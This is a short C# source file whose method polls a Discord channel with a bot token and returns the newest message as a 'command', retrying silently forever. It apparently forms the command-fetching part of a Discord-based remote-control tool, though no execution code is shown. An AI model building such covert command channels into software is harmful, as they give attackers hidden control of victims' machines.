using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace DiscordHook
{
    public class DiscordMessage
    {
        [JsonProperty("content")]
        public string Content { get; private set; }
    }
    public static class DiscordApi
    {
        public static async Task<string> GetCommand(string token, string channelUrl)
        {
            while (true)
            {
                try
                {
                    using var httpclient = new HttpClient();
                    httpclient.DefaultRequestHeaders.Add("authorization", $"Bot {token}");
                    return JsonConvert.DeserializeObject<List<DiscordMessage>>(await httpclient.GetStringAsync(channelUrl))?.ToArray()[0].Content;
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }  
    }
}